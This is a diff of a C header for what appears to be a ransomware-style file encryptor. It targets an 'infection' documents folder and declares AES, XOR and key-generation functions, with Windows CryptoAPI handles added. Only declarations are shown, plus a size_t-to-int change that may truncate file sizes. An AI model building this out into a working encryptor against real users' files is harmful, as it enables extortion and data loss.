@@ -16,13 +16,15 @@
 
 /*------------------------ Cross-platform --------------------------*/
 
-#ifdef _WIN32
+# ifdef _WIN32
 # include <windows.h>
 // Hold the data needed for unmaping the file data
 typedef struct s_windows
 {
-    HANDLE* hFile;
-    HANDLE* hMap;
+    HANDLE*     hFile;
+    HANDLE*     hMap;
+    HCRYPTPROV  hProv;
+    HCRYPTKEY   hKey;
 }   t_windows;
 
 # define DC_TARGET_PATHS        { "D:\\Documents\\infection" } // No '\' at the end
@@ -113,7 +115,7 @@ typedef struct s_env
     unsigned char       *mapped_data; // file is mapped in memory here
     uint16_t            modes;        // options given from command line
     t_dcrypt_header     dcrypt_header;
-    size_t              encrypted_filesize;
+    int                 encrypted_filesize;
     unsigned char       *encryption_key;
     unsigned char       *decryption_key;
     bool                key_allocated;
@@ -135,14 +137,23 @@ int     write_processed_data_to_file(t_env *env, const char *target_path);
 void    xor_with_additive_cipher(
     void *key, size_t key_length, void *data, size_t data_length, int mode);
 
+# ifdef _WIN32
+int     aes_encrypt_data(unsigned char *data, DWORD data_len, \
+    HCRYPTKEY key, unsigned char *iv);
+int     aes_decrypt_data(unsigned char *data, DWORD data_len, \
+    HCRYPTKEY key, unsigned char *iv);
+HCRYPTKEY   generate_encryption_key(void);
+# else
 int     aes_encrypt_data(unsigned char *data, size_t data_len, \
     const unsigned char *key, unsigned char *iv);
 int     aes_decrypt_data(unsigned char *data, size_t data_len, \
     const unsigned char *key, unsigned char *iv);
-unsigned char    *generate_time_based_rand_key_nanosec(const char *_charset, \
-    size_t strength);
 unsigned char    *generate_random_based_key(const char *_charset, \
     size_t strength, bool blocking);
+# endif
+
+unsigned char    *generate_time_based_rand_key_nanosec(const char *_charset, \
+    size_t strength);
 unsigned char    *get_encryption_key(t_env *env);
 
 /*---------------------------- File handling ------------------------*/
